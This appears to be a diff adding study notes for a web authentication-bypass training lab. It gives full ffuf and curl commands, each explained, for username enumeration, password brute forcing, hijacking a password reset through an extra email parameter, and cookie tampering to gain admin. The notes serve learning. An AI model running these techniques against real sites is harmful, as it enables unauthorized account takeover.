@@ -1,0 +1,109 @@
+### Detailed Notes on the Code
+
+#### Username Enumeration
+
+**Command:**
+```sh
+ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
+```
+
+**Explanation:**
+- **`ffuf`**: The tool used for fuzzing web applications.
+- **`-w /usr/share/wordlists/SecLists/Usernames/Names/names.txt`**: Specifies the wordlist containing usernames to test.
+- **`-X POST`**: Sets the HTTP request method to POST.
+- **`-d "username=FUZZ&email=x&password=x&cpassword=x"`**: Data sent in the POST request, where `FUZZ` will be replaced by each username from the wordlist.
+  - **`username=FUZZ`**: The username field we are testing.
+  - **`email=x&password=x&cpassword=x`**: Dummy data for other required fields.
+- **`-H "Content-Type: application/x-www-form-urlencoded"`**: Sets the content type to inform the server we are sending form data.
+- **`-u http://MACHINE_IP/customers/signup`**: URL of the signup form.
+- **`-mr "username already exists"`**: Looks for this specific response text to identify valid usernames.
+
+#### Brute Force Attack
+
+**Command:**
+```sh
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
+```
+
+**Explanation:**
+- **`ffuf`**: Tool for brute forcing.
+- **`-w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2`**: Specifies two wordlists, one for usernames (W1) and one for passwords (W2).
+- **`-X POST`**: Sets the HTTP request method to POST.
+- **`-d "username=W1&password=W2"`**: Data sent in the POST request, using `W1` for the username and `W2` for the password.
+- **`-H "Content-Type: application/x-www-form-urlencoded"`**: Sets the content type to form data.
+- **`-u http://MACHINE_IP/customers/login`**: URL of the login form.
+- **`-fc 200`**: Filters out responses with HTTP status code 200 (OK), indicating failed login attempts. Successful logins will have a different status code.
+
+#### Logic Flaw Exploitation
+
+**Step 1: Simulate Reset Process**
+
+**Command:**
+```sh
+curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
+```
+
+**Explanation:**
+- **`curl`**: Command-line tool for making HTTP requests.
+- **`'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm'`**: URL with email parameter in the query string (note `%40` is the encoded form of `@`).
+- **`-H 'Content-Type: application/x-www-form-urlencoded'`**: Sets the content type to form data.
+- **`-d 'username=robert'`**: Data sent in the POST request, specifying the username.
+
+**Step 2: Exploit Logic Flaw**
+
+**Command:**
+```sh
+curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={your_username}@customer.acmeitsupport.thm'
+```
+
+**Explanation:**
+- Same as above but adds a POST parameter `email={your_username}@customer.acmeitsupport.thm` to redirect the password reset link to your email address.
+
+#### Cookie Tampering
+
+**Initial Request**
+
+**Command:**
+```sh
+curl http://MACHINE_IP/cookie-test
+```
+
+**Explanation:**
+- **`curl http://MACHINE_IP/cookie-test`**: Sends a simple GET request to the URL to see the initial response and cookies.
+
+**Request with Cookies Set**
+
+**Command:**
+```sh
+curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test
+```
+
+**Explanation:**
+- **`curl`**: Command-line tool for making HTTP requests.
+- **`-H "Cookie: logged_in=true; admin=false"`**: Sets the cookies `logged_in` to `true` and `admin` to `false`.
+- **`http://MACHINE_IP/cookie-test`**: URL of the target page.
+
+**Admin Access Request**
+
+**Command:**
+```sh
+curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
+```
+
+**Explanation:**
+- **`curl`**: Command-line tool for making HTTP requests.
+- **`-H "Cookie: logged_in=true; admin=true"`**: Sets the cookies `logged_in` to `true` and `admin` to `true`.
+- **`http://MACHINE_IP/cookie-test`**: URL of the target page.
+
+### Key Points
+
+- **Username Enumeration**: Exploiting error messages to identify valid usernames. - Using "fuff"
+- **Brute Force Attack**: Automating login attempts with known usernames and common passwords. - Using word list provided online 
+- **Logic Flaw Exploitation**: Bypassing authentication checks by manipulating POST and GET data.
+- **Cookie Tampering**: Modifying cookie values to change user privileges.
+
+### Resources
+
+- **Hash Cracking**: [CrackStation](https://crackstation.net/)
+- **Base64 Encoding/Decoding**: [Base64 Decode](https://www.base64decode.org/)
+
